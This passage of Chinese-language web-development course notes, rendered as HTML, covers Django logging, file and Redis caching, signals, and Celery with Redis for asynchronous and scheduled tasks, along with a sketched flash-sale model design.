class=\"string\">&#x27;propagate&#x27;</span>: <span class=\"literal\">False</span>,</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-3-使用日志\"><a href=\"#5-3-使用日志\" class=\"headerlink\" title=\"5.3 使用日志\"></a>5.3 使用日志</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> logging</span><br><span class=\"line\"></span><br><span class=\"line\">logging.getLogger(<span class=\"string\">&#x27;mylogger&#x27;</span>).error(<span class=\"string\">&#x27;请求发生错误&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"六、缓存Cache\"><a href=\"#六、缓存Cache\" class=\"headerlink\" title=\"六、缓存Cache\"></a>六、缓存Cache</h2><h3 id=\"6-1-配置缓存\"><a href=\"#6-1-配置缓存\" class=\"headerlink\" title=\"6.1 配置缓存\"></a>6.1 配置缓存</h3><h4 id=\"6-1-1-文件缓存\"><a href=\"#6-1-1-文件缓存\" class=\"headerlink\" title=\"6.1.1 文件缓存\"></a>6.1.1 文件缓存</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 配置缓存Cache</span></span><br><span class=\"line\">CACHES = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;default&#x27;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;BACKEND&#x27;</span>: <span class=\"string\">&#x27;django.core.cache.backends.filebased.FileBasedCache&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;LOCATION&#x27;</span>: <span class=\"string\">f&#x27;<span class=\"subst\">&#123;BASE_DIR&#125;</span>/mycache&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;TIMEOUT&#x27;</span>: <span class=\"number\">300</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;OPTIONS&#x27;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;MAX_ENTRIES&#x27;</span>: <span class=\"number\">500</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;CULL_FREQUENCY&#x27;</span>: <span class=\"number\">3</span>,</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-2-使用缓存\"><a href=\"#6-2-使用缓存\" class=\"headerlink\" title=\"6.2 使用缓存\"></a>6.2 使用缓存</h3><h4 id=\"6-2-1-文件缓存的使用\"><a href=\"#6-2-1-文件缓存的使用\" class=\"headerlink\" title=\"6.2.1 文件缓存的使用\"></a>6.2.1 文件缓存的使用</h4><p>导包</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.core.cache <span class=\"keyword\">import</span> cache</span><br></pre></td></tr></table></figure>\n\n<p>增加</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">cache.<span class=\"built_in\">set</span>(key, value, timeout)</span><br><span class=\"line\">cache.add(key, value, timeout, version)</span><br></pre></td></tr></table></figure>\n\n<p>读取</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">cache.has_key(key)</span><br><span class=\"line\">value = cache.get(key)</span><br></pre></td></tr></table></figure>\n\n<p>删除</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">cache.delete(key)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"WEB后端服务第18天-Django第8天\"><a href=\"#WEB后端服务第18天-Django第8天\" class=\"headerlink\" title=\"WEB后端服务第18天-Django第8天\"></a>WEB后端服务第18天-Django第8天</h1><h2 id=\"一、Django缓存进阶\"><a href=\"#一、Django缓存进阶\" class=\"headerlink\" title=\"一、Django缓存进阶\"></a>一、Django缓存进阶</h2><p>Django中提供了六种常见缓存策略：</p>\n<ul>\n<li>开发调试</li>\n<li>内存</li>\n<li>文件</li>\n<li>数据库</li>\n<li>Memcache缓存（python-memcached模块）</li>\n<li>Memcache缓存（pylibmc模块）</li>\n</ul>\n<h3 id=\"1-1-cache-page页面缓存\"><a href=\"#1-1-cache-page页面缓存\" class=\"headerlink\" title=\"1.1 cache_page页面缓存\"></a>1.1 cache_page页面缓存</h3><ul>\n<li><p>@cache_page方案</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@cache_page(<span class=\"params\">timeout=<span class=\"number\">10</span>, cache=<span class=\"string\">&#x27;html&#x27;</span>, key_prefix=<span class=\"string\">&#x27;page&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">list</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 验证是否登录</span></span><br><span class=\"line\">    chrs = string.ascii_letters</span><br><span class=\"line\">    char = random.choice(chrs)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> HttpResponse(<span class=\"string\">&#x27;用户列表页面：&lt;br&gt; %s&#x27;</span> % char)</span><br></pre></td></tr></table></figure></li>\n<li><p>cache.set/add() 保存html</p>\n<p>在中间件的process_request和process_response()两个勾子函数中实现页面缓存。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">CachePageMiddleware</span>(<span class=\"title class_ inherited__\">MiddlewareMixin</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 配置缓存的页面路径</span></span><br><span class=\"line\">    cache_page_paths = [</span><br><span class=\"line\">        <span class=\"string\">&#x27;/user/list/&#x27;</span>,</span><br><span class=\"line\">    ]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">process_request</span>(<span class=\"params\">self, request</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 判断当前的请求是否支持缓存</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> request.path <span class=\"keyword\">in</span> self.cache_page_paths:</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 判断页面是否已经缓存</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> cache.has_key(request.path):</span><br><span class=\"line\">                <span class=\"keyword\">return</span> HttpResponse(cache.get(request.path))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">process_response</span>(<span class=\"params\">self, request, response</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 判断当前的请求路径是否要被缓存</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> request.path <span class=\"keyword\">in</span> self.cache_page_paths:</span><br><span class=\"line\">            <span class=\"comment\"># 缓存页面</span></span><br><span class=\"line\">            cache.<span class=\"built_in\">set</span>(request.path, response.content, timeout=<span class=\"number\">5</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> response</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"1-2-Redis缓存配置\"><a href=\"#1-2-Redis缓存配置\" class=\"headerlink\" title=\"1.2 Redis缓存配置\"></a>1.2 Redis缓存配置</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">CACHES = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;default&#x27;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;BACKEND&#x27;</span>: <span class=\"string\">&#x27;django_redis.cache.RedisCache&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;LOCATION&#x27;</span>: <span class=\"string\">&#x27;redis://192.168.200.116:6379/10&#x27;</span>,  <span class=\"comment\"># redis://username:password@host:port/db</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;OPTIONS&#x27;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;CLIENT_CLASS&#x27;</span>: <span class=\"string\">&#x27;django_redis.client.DefaultClient&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;SOCKET_CONNECT_TIMEOUT&#x27;</span>: <span class=\"number\">10</span>,  <span class=\"comment\"># 300秒</span></span><br><span class=\"line\">            <span class=\"string\">&#x27;SOCKET_TIMEOUT&#x27;</span>: <span class=\"number\">10</span>,  <span class=\"comment\"># 300秒</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-3-Session缓存\"><a href=\"#1-3-Session缓存\" class=\"headerlink\" title=\"1.3 Session缓存\"></a>1.3 Session缓存</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 配置session</span></span><br><span class=\"line\">SESSION_ENGINE = <span class=\"string\">&#x27;django.contrib.sessions.backends.cache&#x27;</span></span><br><span class=\"line\">SESSION_COOKIE_NAME = <span class=\"string\">&#x27;SESSION_ID&#x27;</span>  <span class=\"comment\"># sessionid</span></span><br><span class=\"line\">SESSION_COOKIE_PATH = <span class=\"string\">&#x27;/&#x27;</span></span><br><span class=\"line\">SESSION_CACHE_ALIAS = <span class=\"string\">&#x27;default&#x27;</span></span><br><span class=\"line\">SESSION_COOKIE_AGE = <span class=\"number\">1209600</span>  <span class=\"comment\"># 2周有效时间</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、Django信号机制\"><a href=\"#二、Django信号机制\" class=\"headerlink\" title=\"二、Django信号机制\"></a>二、Django信号机制</h2><h3 id=\"2-1-信号的优点\"><a href=\"#2-1-信号的优点\" class=\"headerlink\" title=\"2.1 信号的优点\"></a>2.1 信号的优点</h3><ul>\n<li>监控Django的内部事件</li>\n<li>复杂业务之间解耦</li>\n</ul>\n<h3 id=\"2-2-接收内置的信号\"><a href=\"#2-2-接收内置的信号\" class=\"headerlink\" title=\"2.2 接收内置的信号\"></a>2.2 接收内置的信号</h3><ul>\n<li>普通的接收信号，使用信号对象的connect()函数，如：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.db.models.signals <span class=\"keyword\">import</span> pre_delete</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 声明信号处理的函数</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">model_delete_pre</span>(<span class=\"params\">sender, **kwargs</span>):</span><br><span class=\"line\">    <span class=\"keyword\">from</span> user.models <span class=\"keyword\">import</span> Order</span><br><span class=\"line\">    <span class=\"keyword\">if</span> sender == Order:</span><br><span class=\"line\">    \t<span class=\"built_in\">print</span>(info % (<span class=\"string\">&#x27;订单模型&#x27;</span>, kwargs.get(<span class=\"string\">&#x27;instance&#x27;</span>).<span class=\"built_in\">id</span>, kwargs.get(<span class=\"string\">&#x27;instance&#x27;</span>).title))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 接收信号</span></span><br><span class=\"line\">pre_delete.connect(model_delete_pre)</span><br></pre></td></tr></table></figure>\n\n<p>【注意】信号处理函数的参数声明一般是固定的，**kwargs是一种简单的写法，也可以写成关键参数形式，但不灵活。</p>\n<ul>\n<li>支持装饰器的方式接收信号与连接信息处理函数，如：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.db.models.signals <span class=\"keyword\">import</span> pre_delete, post_delete</span><br><span class=\"line\"><span class=\"keyword\">from</span> django.dispatch <span class=\"keyword\">import</span> receiver</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@receiver(<span class=\"params\">post_delete</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete_model_post</span>(<span class=\"params\">sender, **kwargs</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(sender, <span class=\"string\">&#x27;删除成功&#x27;</span>, kwargs)</span><br><span class=\"line\"></span><br><span class=\"line\">pre_delete.connect(model_delete_pre)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-3-自定义信号\"><a href=\"#2-3-自定义信号\" class=\"headerlink\" title=\"2.3 自定义信号\"></a>2.3 自定义信号</h3><ul>\n<li>创建信号</li>\n</ul>\n<p>在项目下创建signals包，并在init.py脚本中声明信号</p>\n<figure class=\"highlight py\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django <span class=\"keyword\">import</span> dispatch</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义信号，providing_args-声明发送信号的参数列表</span></span><br><span class=\"line\"><span class=\"comment\"># codeSignal = dispatch.Signal(providing_args=[&#x27;path&#x27;, &#x27;phone&#x27;, &#x27;code&#x27;])</span></span><br><span class=\"line\"><span class=\"comment\"># The providing_args argument for django.dispatch.Signal is removed.</span></span><br><span class=\"line\">codeSignal = dispatch.Signal()</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>发送信号</p>\n<p>根据业务的需求，在适当位置发送信号</p>\n</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">new_code</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 生成手机验证码</span></span><br><span class=\"line\">    <span class=\"comment\"># 随机产生验证码：大小写字母+数字</span></span><br><span class=\"line\">    code_text = code.new_code_str(<span class=\"number\">4</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(code_text)</span><br><span class=\"line\"></span><br><span class=\"line\">    phone = request.GET.get(<span class=\"string\">&#x27;phone&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(phone)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 发送信号，sender 名称可以根据需求设定，关键参数列表，根据信号定义的参数表传值</span></span><br><span class=\"line\">    signals.codeSignal.send(<span class=\"string\">&#x27;new_code&#x27;</span>, path=request.path, phone=phone, code=code_text)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> HttpResponse(<span class=\"string\">&#x27;发送验证码到%s成功&#x27;</span> % phone)</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>接收信号</p>\n<p>可以在app模块的init.py脚本中接收特定的信号。</p>\n</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> signals <span class=\"keyword\">import</span> codeSignal</span><br><span class=\"line\"><span class=\"keyword\">from</span> django <span class=\"keyword\">import</span> dispatch</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 接收信号</span></span><br><span class=\"line\"><span class=\"meta\">@dispatch.receiver(<span class=\"params\">codeSignal</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cache_code</span>(<span class=\"params\">sender, **kwargs</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;dispatch.receiver&lt;codeSignal&gt;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(sender, kwargs)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、高并发解决方案Celery-Redis队列\"><a href=\"#三、高并发解决方案Celery-Redis队列\" class=\"headerlink\" title=\"三、高并发解决方案Celery+Redis队列\"></a>三、高并发解决方案Celery+Redis队列</h2><h3 id=\"3-1-概念-1\"><a href=\"#3-1-概念-1\" class=\"headerlink\" title=\"3.1 概念\"></a>3.1 概念</h3><p>Celery解决C10K问题，通过消息中间件和后台的任务执行单元解决高并发问题。</p>\n<p>Celery的组成部分：</p>\n<ul>\n<li>消息中间件Broker，Celery本身并没有实现功能，知识一种接口或规范，在使用Celery时，必须指定消息中间件实现方案（Redis发布、订阅，RabbitMQ）</li>\n<li>任务执行单元Worker，后台进程</li>\n<li>任务执行单元的结果存储Result。</li>\n</ul>\n<h3 id=\"3-2-配置\"><a href=\"#3-2-配置\" class=\"headerlink\" title=\"3.2 配置\"></a>3.2 配置</h3><p>文档：<a href=\"http://docs.celeryproject.org/en/latest/django/index.html\">http://docs.celeryproject.org/en/latest/django/index.html</a></p>\n<p>注意：Windows在Celery4.0之后，不支持多进程方式，更换成协程方式(eventlet, gevent)</p>\n<p>安装库</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install celery==<span class=\"number\">4.4</span><span class=\"number\">.0</span>rc3 eventlet</span><br></pre></td></tr></table></figure>\n\n<p>在主项目的目录下，创建celery.py，内容：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> __future__ <span class=\"keyword\">import</span> absolute_import, unicode_literals</span><br><span class=\"line\"><span class=\"keyword\">from</span> celery <span class=\"keyword\">import</span> Celery</span><br><span class=\"line\"></span><br><span class=\"line\">os.environ.setdefault(<span class=\"string\">&#x27;DJANGO_SETTINGS_MODULE&#x27;</span>, <span class=\"string\">&#x27;advanceDjango.settings&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app = celery(<span class=\"string\">&#x27;advanceDjango&#x27;</span>, broker=<span class=\"string\">&#x27;redis://127.0.0.1:6379/8&#x27;</span>)</span><br><span class=\"line\">app.config_from_object(<span class=\"string\">&#x27;django.conf:settings&#x27;</span>)  <span class=\"comment\"># 配置Celery，加载settings.py</span></span><br><span class=\"line\"></span><br><span class=\"line\">app.autodiscover_tasks()  <span class=\"comment\"># 自动发现task任务</span></span><br></pre></td></tr></table></figure>\n\n<p>在主项目的init.py脚本中，增加<strong>all</strong>属性。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> __future__ <span class=\"keyword\">import</span> absolute_import, unicode_literals</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> .celery <span class=\"keyword\">import</span> app <span class=\"keyword\">as</span> celery_app</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 向项目模块中增加celery_app对象</span></span><br><span class=\"line\">__all__ = (<span class=\"string\">&#x27;celery_app&#x27;</span>,)</span><br></pre></td></tr></table></figure>\n\n<p>在app应用模块中，创建tasks.py文件</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> celery <span class=\"keyword\">import</span> shared_task</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@shared_task</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">qbuy</span>(<span class=\"params\">goods_id, user_id</span>):</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;goods_id: %s -&gt; user_id: %s&#x27;</span> % (goods_id, user_id))</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"string\">&#x27;goods_id: %s -&gt; user_id: %s&#x27;</span> % (goods_id, user_id)</span><br></pre></td></tr></table></figure>\n\n<p>在主项目的settings.py文件，配置Celery的选项</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">CELERY_IMPORTS = (<span class=\"string\">&#x27;stockapp.tasks&#x27;</span>, )</span><br></pre></td></tr></table></figure>\n\n<p>启动Celery</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; celery -A advanceDjango worker -P eventlet -l info</span><br></pre></td></tr></table></figure>\n\n<p>-P指定执行单元的实现方式，指定eventlet表示以协程方式实现后台执行单元的异步操作。</p>\n<p>调用异步任务，@shared_task修改的任务函数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">qbuy.delay(<span class=\"string\">&#x27;10009&#x27;</span>, <span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n\n<p>如果Celery服务接收任务，并执行，可以看到执行的结果。但是结果发出的警告，表示没有处理执行单元完成任务的结果。</p>\n<p><strong>存储任务结果</strong></p>\n<ul>\n<li>存储到redis</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">app = Celery(<span class=\"string\">&#x27;advanceDjango&#x27;</span>, broker=<span class=\"string\">&#x27;redis://192.168.200.116:6379/8&#x27;</span>, \t\t\t  \t\t\t                    backend=<span class=\"string\">&#x27;redis://192.168.200.116:6379/7&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>在创建时，指定Celery()的backend参数，指定results存储到redis中。</p>\n<ul>\n<li>django-celery-results</li>\n</ul>\n<p>安装存储任务执行结果库</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install django-celery-results</span><br></pre></td></tr></table></figure>\n\n<p>在settings.py文件中，配置result存储方案</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">INSTALLED_APPS = [</span><br><span class=\"line\">\t....</span><br><span class=\"line\">\t<span class=\"string\">&#x27;django_celery_results&#x27;</span>,</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">CELERY_RESULT_BACKEND = <span class=\"string\">&#x27;django-db&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># CELERY_CACHE_BACKEND = &#x27;django-cache&#x27;  # 缓存信息</span></span><br></pre></td></tr></table></figure>\n\n<p>迁移Celery结果相关的库</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">python manage.py migrate django_celery_results</span><br></pre></td></tr></table></figure>\n\n<p>迁移成功之后，重新启动Celery。</p>\n<p>调试任务</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">async_result = qbuy.delay(<span class=\"string\">&#x27;10009&#x27;</span>, <span class=\"number\">2</span>)</span><br><span class=\"line\">async_result.ready()  <span class=\"comment\"># 返回False或True，True表示结果已就绪</span></span><br><span class=\"line\">async_result.result  <span class=\"comment\"># 查看任务结果</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-3-抢购的实现\"><a href=\"#3-3-抢购的实现\" class=\"headerlink\" title=\"3.3 抢购的实现\"></a>3.3 抢购的实现</h3><p>涉及的技术点：ajax请求，redis的hash，cache使用</p>\n<h3 id=\"3-4-Celery其他配置\"><a href=\"#3-4-Celery其他配置\" class=\"headerlink\" title=\"3.4 Celery其他配置\"></a>3.4 Celery其他配置</h3><p>格式化：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>时区：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>scheduler计划任务</p>\n<p>文档：<a href=\"http://docs.celeryproject.org/en/latest/userguide/periodic-tasks.html\">http://docs.celeryproject.org/en/latest/userguide/periodic-tasks.html</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install django-celery-beat</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">INSTALLED_APPS = [</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"string\">&#x27;django_celery_results&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django_celery_beat&#x27;</span>,</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">&gt; </span><span class=\"language-bash\">python manage.py migrate django_celery_beat</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">CELERY_TIMEZONE = TIME_ZONE</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 配置计划任务调度类</span></span><br><span class=\"line\">CELERY_BEAT_SCHEDULE = <span class=\"string\">&#x27;django_celery_beat.schedulers.DatabaseScheduler&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">CELERY_BEAT_SCHEDULE = &#123;</span><br><span class=\"line\">    <span class=\"string\">U&#x27;定时同步数据2&#x27;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;task&#x27;</span>: <span class=\"string\">&#x27;stockapp.tasks.con_data&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;schedule&#x27;</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;args&#x27;</span>: (<span class=\"string\">&#x27;同步oracle&#x27;</span>, )</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@shared_task</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">con_data</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;开始同步数据：%s&#x27;</span> % content)</span><br><span class=\"line\">\tlogging.getLogger(<span class=\"string\">&#x27;&#x27;</span>).info(<span class=\"string\">&#x27;开始同步数据：%s&#x27;</span> % content)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"string\">&#x27;同步完成&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">&gt; </span><span class=\"language-bash\">celery -A advanceDjango worker -B -l info -f celery.log</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"WEB后端服务第19天-Django第9天\"><a href=\"#WEB后端服务第19天-Django第9天\" class=\"headerlink\" title=\"WEB后端服务第19天-Django第9天\"></a>WEB后端服务第19天-Django第9天</h1><h2 id=\"一、基于Celery-Redis实现抢购方案\"><a href=\"#一、基于Celery-Redis实现抢购方案\" class=\"headerlink\" title=\"一、基于Celery+Redis实现抢购方案\"></a>一、基于Celery+Redis实现抢购方案</h2><p>项目：<a href=\"mailto:&#103;&#x69;&#x74;&#x40;&#x67;&#x69;&#116;&#104;&#117;&#x62;&#x2e;&#x63;&#111;&#109;\">&#103;&#x69;&#x74;&#x40;&#x67;&#x69;&#116;&#104;&#117;&#x62;&#x2e;&#x63;&#111;&#109;</a>:disenQF/QBuyPro.git</p>\n<h3 id=\"1-1-业务描述\"><a href=\"#1-1-业务描述\" class=\"headerlink\" title=\"1.1 业务描述\"></a>1.1 业务描述</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">实现抢购活动开始后，每位用户每天只限抢购一件商品。</span><br><span class=\"line\">活动信息：图片、标题、商品、价格折扣、开始时间、结束时间</span><br><span class=\"line\"></span><br><span class=\"line\">另外：每天限量 5</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-2-设计模型类\"><a href=\"#1-2-设计模型类\" class=\"headerlink\" title=\"1.2 设计模型类\"></a>1.2 设计模型类</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Goods</span>(models.Model):</span><br><span class=\"line\">    <span class=\"comment\"># 名称</span></span><br><span class=\"line\">    <span class=\"comment\"># 单价</span></span><br><span class=\"line\">    <span class=\"comment\"># 描述</span></span><br><span class=\"line\">    <span class=\"comment\"># 图片</span></span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">LoginUser</span>(models.Model):</span><br><span class=\"line\">    <span class=\"comment\"># 登录名</span></span><br><span class=\"line\">    <span class=\"comment\"># 登录口令</span></span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ActiveModel</span>(models.Model):</span><br><span class=\"line\">    <span class=\"comment\"># 名称</span></span><br><span class=\"line\">    <span class=\"comment\"># 图片</span></span><br><span class=\"line\">    <span class=\"comment\"># 开始时间</span></span><br><span class=\"line\">    <span class=\"comment\"># 结束时间</span></span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ActiveGoodsModel</span>(model.Model):</span><br><span class=\"line\">    <span class=\"comment\"># 活动ID - ForiegnKey(ActiveModel=)</span></span><br><span class=\"line\">    <span class=\"comment\"># 商品ID - ForeignKey(Goods, related_name=)</span></span><br><span class=\"line\">    <span class=\"comment\"># 折扣 rate  小数</span></span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\"># 增加订单和订单详情模型</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"二、Django中引入富文本方案\"><a href=\"#二、Django中引入富文本方案\" class=\"headerlink\" title=\"二、Django中引入富文本方案\"></a>二、Django中引入富文本方案</h2><h3 id=\"2-1-tinymce方案\"><a href=\"#2-1-tinymce方案\" class=\"headerlink\" title=\"2.1 tinymce方案\"></a>2.1 tinymce方案</h3><h3 id=\"2-2-mdeditor方案\"><a href=\"#2-2-mdeditor方案\" class=\"headerlink\" title=\"2.2 mdeditor方案\"></a>2.2 mdeditor方案</h3><h3 id=\"2-3-ueditor方案\"><a href=\"#2-3-ueditor方案\" class=\"headerlink\" title=\"2.3 ueditor方案\"></a>2.3 ueditor方案</h3><p>参考文档：<a href=\"http://www.jianshu.com/p/d236a33a8c01\">http://www.jianshu.com/p/d236a33a8c01</a></p>\n<h1 